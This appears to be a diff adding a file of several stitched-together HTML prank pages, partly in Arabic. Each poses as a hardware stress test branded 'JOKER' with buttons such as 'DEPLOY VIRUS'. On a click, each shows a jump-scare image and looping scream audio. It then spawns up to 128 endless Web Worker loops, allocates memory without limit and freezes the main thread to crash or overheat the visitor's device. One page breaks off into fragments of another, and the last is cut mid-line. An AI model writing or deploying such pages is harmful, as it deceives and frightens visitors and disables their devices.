@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM CRITICAL FAILURE</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #ff0000; 
+            font-family: 'Courier New', monospace; 
+            margin: 0; 
+            overflow: hidden; 
+            text-align: center;
+            user-select: none;
+        }
+        /* Horror Overlay */
+        #horror-overlay { 
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%; 
+            background: #000 url('https://i.imgur.com/H6SAnZ9.gif') no-repeat center center; 
+            background-size: cover; 
+            z-index: 9999; 
+        }
+        .glitch {
+            font-size: 8vw;
+            font-weight: 900;
+            color: white;
+            text-shadow: 0 0 20px red;
+            margin-top: 35vh;
+            animation: shake 0.1s infinite;
+        }
+        /* Setup Box */
+        .container { margin-top: 25vh; border: 4px solid #ff0000; display: inline-block; padding: 40px; background: rgba(20,0,0,0.9); box-shadow: 0 0 50px #ff0000; border-radius: 20px; }
+        h1 { font-size: 2.5em; text-transform: uppercase; letter-spacing: 5px; }
+        button { 
+            background: #ff0000; 
+            color: #fff; 
+            border: none; 
+            padding: 20px 50px; 
+            font-size: 24px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            border-radius: 10px; 
+            box-shadow: 0 0 20px #fff;
+            transition: 0.2s;
+        }
+        button:active { transform: scale(0.9); box-shadow: none; }
+        @keyframes shake {
+            0% { transform: translate(0); }
+            25% { transform: translate(5px, 5px); }
+            50% { transform: translate(-5px, -5px); }
+            75% { transform: translate(5px, -5px); }
+            100% { transform: translate(0); }
+        }
+    </style>
+</head>
+<body>
+
+<div id="horror-overlay">
+    <div class="glitch">SYSTEM TERMINATED<br>BY JOKER</div>
+</div>
+
+<div id="main-ui" class="container">
+    <h1>Hardware Stress Test</h1>
+    <p>Target: Octa-Core CPU / 16GB RAM</p>
+    <p style="color: yellow;">Status: High Intensity Mode Ready</p>
+    <button onclick="launchAttack()">EXECUTE PROTOCOL</button>
+</div>
+
+<script>
+    function launchAttack() {
+        // 1. Activate Visuals and Audio
+        document.getElementById('horror-overlay').style.display = 'block';
+        document.getElementById('main-ui').style.display = 'none';
+        
+        let scream = new Audio('https://www.soundjay.com/human/sounds/shout-01.mp3');
+        scream.loop = true;
+        scream.play().catch(e => console.log("Audio play blocked"));
+
+        // 2. CPU Multi-Thread Overload (128 Workers)
+        const workerBlob = new Blob([
+            "onmessage = function() { while(true) { Math.sqrt(Math.random() * 1234567) * Math.atan(Math.random()); } }"
+        ], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(workerBlob);
+
+        for (let i = 0; i < 128; i++) {
+            new Worker(workerUrl).postMessage("start");
+        }
+
+        // 3. RAM Massive Injection (Targeting 16GB)
+        let memoryVault = [];
+        setInterval(() => {
+            try {
+                for (let i = 0; i < 1000; i++) {
+                    // Constant allocation of large 64-bit arrays
+                    memoryVault.push(new BigInt64Array(1000000).fill(999n));
+                }
+            } catch (e) {
+                console.warn("Buffer Overflow");
+            }
+        }, 25);
+
+        // 4. Thread Lock (Freeze Screen)
+        setTimeout(() => {
+            while(true) {
+                window.scrollBy(0, Math.random() * 100);
+                console.error("KERNEL_PANIC_0x000FF");
+            }
+        }, 1000);
+    }
+</script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRITICAL SYSTEM ERROR</title>
+    <style>
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; text-align: center; }
+        #scary-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000 url('https://i.imgur.com/H6SAnZ9.gif') no-repeat center center; background-size: cover; z-index: 9999; }
+        .glitch-text { color: white; font-size: 8vw; font-weight: bold; margin-top: 30vh; text-shadow: 0 0 20px #f00; animation: shake 0.1s infinite; }
+        .main-box { margin-top: 25vh; border: 3px solid #f00; display: inline-block; padding: 40px; box-shadow: 0 0 30px #f00; background: rgba(20,0,0,0.9); border-radius: 15px; }
+        button { background: #f00; color: #fff; border: none; padding: 25px 60px; font-size: 28px; cursor: pointer; font-weight: bold; border-radius: 10px; box-shadow: 0 0 20px #fff; }
+        @keyframes shake { 0% { transform: translate(0); } 25% { transform: translate(5px, 5px); } 50% { transform: translate(-5px, -5px); } 100% { transform: translate(0); } }
+    </style>
+</head>
+<body>
+
+<div id="scary-overlay">
+    <div class="glitch-text">SYSTEM HACKED<br>BY JOKER</div>
+</div>
+
+<div id="ui" class="main-box">
+    <h1 style="font-size: 3em;">FATAL ERROR</h1>
+    <p>TARGET: 16GB RAM / 64-CORE THREADS</p>
+    <p style="color: yellow;">WARNING: DEVICE OVERHEATING IMMINENT</p>
+    <button onclick="activate()">DEPLOY VIRUS</button>
+</div>
+
+<script>
+    function activate() {
+        document.getElementById('scary-overlay').style.display = 'block';
+        document.getElementById('ui').style.display = 'none';
+
+        // تشغيل صوت صرخة مرعبة بشكل مستمر
+        let sfx = new Audio('https://www.soundjay.com/human/sounds/shout-01.mp3');
+        sfx.loop = true;
+        sfx.play().catch(() => console.log("Audio blocked"));
+
+        // هجوم المعالج (128 Worker لجعل الهاتف يسخن فوراً)
+        const code = `onmessage=function(){while(true){Math.sqrt(Math.random()*999999);}}`;
+        const blob = new Blob([code], {type:'application/javascript'});
+        const url = URL.createObjectURL(blob);
+        for(let i=0; i<128; i++) { new Worker(url).postMessage(1); }
+
+        // هجوم الرام (ملء الـ 16 جيجا في ثوانٍ)
+        let leak = [];
+        setInterval(() => {
+            try {
+                for(let i=0; i<800; i++) { leak.push(new BigInt64Array(1000000).fill(666n)); }
+            } catch(e) {}
+        }, 20);
+
+        // تجميد النظام بالكامل
+        setTimeout(() => { while(true) { window.scrollTo(0, Math.random()*500); } }, 1500);
+    }
+</script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRITICAL SYSTEM OVERLOAD</title>
+    <style>
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; text-align: center; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000 url('https://i.imgur.com/H6SAnZ9.gif') no-repeat center center; background-size: cover; z-index: 9999; }
+        .hacker-text { color: white; font-size: 10vw; font-weight: bold; margin-top: 30vh; text-shadow: 0 0 20px #f00; animation: shake 0.1s infinite; }
+        .setup-box { margin-top: 25vh; border: 3px solid #f00; display: inline-block; padding: 30px; box-shadow: 0 0 30px #f00; background: rgba(30,0,0,0.9); }
+        button { background: #f00; color: #fff; border: none; padding: 25px 60px; font-size: 25px; cursor: pointer; font-weight: bold; border-radius: 5px; box-shadow: 0 0 15px #fff; }
+        @keyframes shake { 0% { transform: translate(0); } 25% { transform: translate(5px, -5px); } 50% { transform: translate(-5px, 5px); } 100% { transform: translate(0); } }
+    </style>
+</head>
+<body>
+
+<div id="overlay">
+    <div class="hacker-text">SYSTEM HACKED</div>
+</div>
+
+<div id="setup" class="setup-box">
+    <h1>JOKER SYSTEM STRESS V2</h1>
+    <p>HARDWARE TARGET: 16GB RAM / OCTA-CORE CPU</p>
+    <p style="color: yellow;">WARNING: SYSTEM STABILITY NOT GUARANTEED</p>
+    <button onclick="startExplosion()">DEPLOY DESTRUCTION</button>
+</div>
+
+<script>
+    function startExplosion() {
+        // 1. Visual & Audio Action
+        document.getElementById('overlay').style.display = 'block';
+        document.getElementById('setup').style.display = 'none';
+
+        // High frequency scream audio
+        let audio = new Audio('https://www.soundjay.com/human/sounds/shout-01.mp3');
+        audio.loop = true;
+        audio.play().catch(e => console.log("Audio play blocked - user interaction required"));
+
+        // 2. CPU Attack: 128 Threads to overwhelm the Kernel
+        const workerCode = `
+            onmessage = function() {
+                while(true) {
+                    Math.sqrt(Math.random() * 1234567) / Math.sin(Math.random());
+                }
+            }
+        `;
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+
+        for (let i = 0; i < 128; i++) {
+            new Worker(workerUrl).postMessage("start");
+        }
+
+        // 3. RAM Attack: Filling 16GB exponentially
+        let memoryBank = [];
+        setInterval(() => {
+            try {
+                for (let j = 0; j < 1000; j++) {
+                    memoryBank.push(new BigInt64Array(1000000).fill(666n));
+                }
+            } catch (e) {
+                console.log("RAM FULL!");
+            }
+        }, 20);
+
+        // 4. Main Thread Lockdown
+        setTimeout(() => {
+            while(true) {
+                window.scrollTo(0, Math.random() * 1000);
+            }
+        }, 1000);
+    }
+</script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM STRESS TEST PRO</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #00ff00; 
+            font-family: 'Courier New', Courier, monospace; 
+            text-align: center; 
+            margin: 0;
+            overflow: hidden;
+            user-select: none;
+        }
+        #ui-container { margin-top: 25vh; }
+        .warning-box {
+            border: 2px solid #ff0000;
+            padding: 30px;
+            display: inline-block;
+            border-radius: 15px;
+            box-shadow: 0 0 20px #ff0000;
+            background: rgba(20, 0, 0, 0.8);
+        }
+        h1 { font-size: 2.5em; color: #ff0000; text-transform: uppercase; }
+        p { font-size: 1.2em; color: #ccc; }
+        
+        button { 
+            background: #ff0000; 
+            color: #fff; 
+            border: none; 
+            padding: 20px 60px; 
+            font-size: 24px; 
+            cursor: pointer; 
+            font-weight: bold;
+            margin-top: 25px;
+            border-radius: 5px;
+            box-shadow: 0 5px 0 #800;
+            transition: 0.1s;
+        }
+        button:active { transform: translateY(5px); box-shadow: none; }
+
+        /* The Hidden Hacker/Scary Overlay */
+        #scary-overlay {
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%;
+            background: #000 url('https://i.imgur.com/H6SAnZ9.gif') no-repeat center center;
+            background-size: cover; 
+            z-index: 9999;
+        }
+        .hacker-label {
+            color: #ff0000;
+            font-size: clamp(50px, 15vw, 120px);
+            font-weight: 900;
+            margin-top: 25vh;
+            text-shadow: 0 0 30px #fff, 0 0 50px #ff0000;
+            animation: glitch 0.1s infinite;
+        }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-5px, 5px); }
+            40% { transform: translate(-5px, -5px); }
+            60% { transform: translate(5px, 5px); }
+            80% { transform: translate(5px, -5px); }
+            100% { transform: translate(0); }
+        }
+    </style>
+</head>
+<body>
+
+<div id="scary-overlay">
+    <div class="hacker-label">HACKER</div>
+</div>
+
+<div id="ui-container">
+    <div class="warning-box">
+        <h1>Extreme Stress Test</h1>
+        <p>Target: 16GB RAM / High-End SOC</p>
+        <p style="color: #ffcc00;">Status: Ready for Deployment</p>
+        <button onclick="launch()">START OVERLOAD</button>
+    </div>
+</div>
+
+<script>
+    function launch() {
+        // 1. Show the Hacker Overlay immediately
+        document.getElementById('scary-overlay').style.display = 'block';
+        document.getElementById('ui-container').style.display = 'none';
+</style>
+</head>
+<body>
+
+<div id="scary-overlay">
+    <h1 style="color: white; font-size: 80px; margin-top: 20%; text-shadow: 0 0 20px red;">HACKER</h1>
+</div>
+
+<div id="ui-container">
+    <div class="warning-box">
+        <h1 id="status-text">HACKER SYSTEM STRESS</h1>
+        <p>Target: 16GB RAM / 32-Core CPU</p>
+        <button onclick="launchDestruction()">EXECUTE</button>
+    </div>
+</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Performance Stress Test</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #ff0000; 
+            font-family: 'Courier New', Courier, monospace; 
+            text-align: center; 
+            margin: 0;
+            overflow: hidden;
+        }
+        #ui-container { margin-top: 25vh; }
+        .warning-box {
+            border: 2px solid #ff0000;
+            padding: 20px;
+            display: inline-block;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #f00;
+        }
+        button { 
+            background: #f00; 
+            color: #fff; 
+            border: none; 
+            padding: 20px 50px; 
+            font-size: 22px; 
+            cursor: pointer; 
+            font-weight: bold;
+            margin-top: 20px;
+            border-radius: 5px;
+        }
+        /* Scary Overlay hidden by default */
+        #scary-overlay {
+            display: none; 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%;
+            background: #000 url('https://i.imgur.com/H6SAnZ9.gif') no-repeat center center;
+            background-size: cover; 
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+
+<div id="scary-overlay"></div>
+
+<div id="ui-container">
+    <div class="warning-box">
+        <h1>SYSTEM STRESS TEST PRO</h1>
+        <p>Target: 16GB RAM / Multi-Core CPU</p>
+        <p>Status: Ready for Execution</p>
+        <button onclick="launchDestruction()">START STRESS TEST</button>
+    </div>
+</div>
+
+<script>
+    function launchDestruction() {
+        // 1. Trigger Visual & Audio Jump-scare
+        document.getElementById('scary-overlay').style.display = 'block';
+        document.getElementById('ui-container').style.display = 'none';
+
+        // Optional: High-frequency sound effect
+        let audio = new Audio('https://www.soundjay.com/human/sounds/shout-01.mp3');
+        audio.play().catch(e => console.log("Audio requires manual interaction first"));
+
+        // 2. CPU Attack: Launching 64 Web Workers to bypass UI throttling
+        const workerCode = `
+            onmessage = function() {
+                while(true) {
+                    // Constant complex mathematical calculation
+                    let x = Math.random() * Math.sqrt(Math.random()) / Math.sin(Math.random());
+                }
+            }
+        `;
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        const workerUrl = URL.createObjectURL(blob);
+
+        for (let i = 0; i < 64; i++) {
+            const worker = new Worker(workerUrl);
+            worker.postMessage("start");
+        }
+
+        // 3. RAM Attack: Massive allocation to fill 16GB
+        let memoryLeakContainer = [];
+        setInterval(() => {
+            try {
+                // Pushing large arrays rapidly
+                for (let j = 0; j < 500; j++) {
+                    memoryLeakContainer.push(new BigUint64Array(1000000).fill(123456789n));
+                }
+            } catch (e) {
+                console.log("Memory limit reached or Tab crashed!");
+            }
+        }, 50);
+
+        // 4. Force browser to freeze the DOM
+        while(true) {
+            console.log("SYSTEM_OVERLOAD_ACTIVE");
+        }
+    }
+</script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختبار أداء النظام - PRO</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: sans-serif; text-align: center; overflow: hidden; }
+        .setup { margin-top: 20vh; }
+        button { 
+            background: #f00; color: #fff; border: none; padding: 20px 40px; 
+            font-size: 20px; cursor: pointer; border-radius: 10px; font-weight: bold;
+            box-shadow: 0 0 20px #f00;
+        }
+        /* الشاشة المخيفة المخفية */
+        #scary-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: url('https://i.imgur.com/H6SAnZ9.gif') no-repeat center center;
+            background-size: cover; z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+
+<div id="scary-overlay"></div>
+
+<div class="setup" id="main">
+    <h1>اختبار الضغط الأقصى (CPU/RAM)</h1>
+    <p>سيتم تشغيل 32 خيط معالجة لإجهاد الـ 16 جيجا رام.</p>
+    <button onclick="startStress()">ابدأ التدمير الشامل</button>
+</div>
+
+<script>
+    function startStress() {
+        // 1. إظهار الصورة المخيفة
+        document.getElementById('scary-overlay').style.display = 'block';
+        document.getElementById('main').style.display = 'none';
+
+        // 2. محاكاة صوت صرخة (اختياري إذا أردت إضافة رابط صوت)
+        let audio = new Audio('https://www.soundjay.com/human/sounds/shout-01.mp3');
+        audio.play();
+
+        // 3. إطلاق الـ Web Workers لإجهاد المعالج
+        // سنقوم بإنشاء Worker "وهمي" داخل الكود
+        const blob = new Blob([`
+            onmessage = function() {
+                while(true) {
+                    Math.sqrt(Math.random() * 99999999); // عملية حسابية معقدة
+                }
+            }
+        `], { type: 'application/javascript' });
+
+        const workerUrl = URL.createObjectURL(blob);
+
+        // إطلاق 32 خيط معالجة (Thread) لضمان شلل المعالج تماماً
+        for (let i = 0; i < 32; i++) {
+            const worker = new Worker(workerUrl);
+            worker.postMessage("start");
+        }
+
+        // 4. استهلاك الذاكرة (RAM) بشكل جنوني
+        let memoryBurner = [];
+        setInterval(() => {
+            for (let i = 0; i < 1000; i++) {
+                memoryBurner.push(new Array(1000000).fill("💀"));
+            }
+        }, 100);
+    }
+</script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>ULTIMATE SYSTEM STRESS - PRO</title>
+    <style>
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
+        .container { border: 2px solid #00ff00; padding: 20px; border-radius: 15px; display: inline-block; }
+        .warning { font-size: 25px; color: #fff; background: #f00; padding: 10px; animation: blink 0.5s infinite; }
+        button { background: #f00; color: #fff; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; border-radius: 5px; font-weight: bold; }
+        button:hover { background: #b00; }
+        #stats { margin: 20px; font-size: 24px; color: #00d4ff; }
+        #log { font-size: 14px; color: #888; height: 100px; overflow: hidden; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.2; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="warning">⚠️ WARNING: HIGH RESOURCE CONSUMPTION ⚠️</div>
+    <h1>JOKER SYSTEM STRESS</h1>
+    <div id="stats">Status: Ready</div>
+    <div id="ram-val" style="font-size: 40px; margin-bottom: 10px;">0 MB</div>
+    <button id="startBtn" onclick="runSmartTest()">LAUNCH TOTAL DESTRUCTION</button>
+    <div id="log"></div>
+</div>
+
+<script>
+    let memoryStore = [];
+    let isRunning = false;
+
+    function log(msg) {
+        const l = document.getElementById('log');
+        l.innerHTML = msg + "<br>" + l.innerHTML;
+    }
+
+    // 1. CPU Multi-Threading Attack
+    function cpuHeavyTask() {
+        if (!isRunning) return;
+        let start = Date.now();
+        while (Date.now() - start < 100) {
+            Math.atan(Math.random()) * Math.pow(Math.random(), 5);
+        }
+        setTimeout(cpuHeavyTask, 0);
+    }
+
+    function runSmartTest() {
+        if (isRunning) return;
+        isRunning = true;
+        document.getElementById('stats').innerText = "Status: STRESSING SYSTEM...";
+        document.getElementById('startBtn').style.display = 'none';
+
+        log("Starting CPU Workers...");
+        for (let i = 0; i < 20; i++) {
+            cpuHeavyTask();
+        }
+
+        log("Starting RAM Explosion...");
+        setInterval(() => {
+            try {
+                for (let j = 0; j < 50; j++) {
+                    let buffer = new Uint
+
